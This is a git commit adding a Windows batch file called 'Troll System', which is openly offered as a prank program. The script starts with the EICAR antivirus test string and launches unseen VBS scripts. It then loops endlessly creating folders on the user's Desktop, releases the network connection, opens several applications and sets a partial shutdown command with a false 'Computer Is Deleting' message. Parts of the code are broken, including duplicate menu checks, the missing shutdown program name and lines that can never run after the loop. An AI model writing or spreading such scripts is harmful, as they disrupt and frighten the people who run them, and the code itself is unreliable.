d75fb0c990cd14d911f2902b6f25ad7f1c25db47
danialcraftplayz <80623527+danialcraftplayz@users.noreply.github.com>
2021-10-18 18:53:25 +0330

    Add files via upload

---
+++ Troll_System.bat
@@ -0,0 +1,49 @@
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+@echo off
+CLS
+:MENU
+color 4
+
+
+ECHO TROLL SYSTEM =)
+pause
+color 2
+cls
+ECHO Welecome %USERNAME%
+ECHO Also %USERNAME% Remember Is Your Own Risk To Run This Bat File :)
+ECHO 1 - START
+ECHO 2 - EXIT
+
+SET /P M=CHOOSE IT :
+IF %M%==1 GOTO START
+IF %M%==1 GOTO EXIT
+
+:START
+@echo off
+color 2
+cls
+cd data
+1.vbs
+2.vbs
+3.vbs
+cd C:\Users\%USERNAME%\Desktop
+:top
+md TROLL
+goto top
+4.vbs
+5.vbs
+Ipconfig /release
+6.vbs
+start winword
+start mspaint
+start notepad
+start write
+7.vbs
+-s -t 120 -c “Troll Detected. The Computer Is Deleting”
+
+
+
+:EXIT
+exit
+GOTO MENU
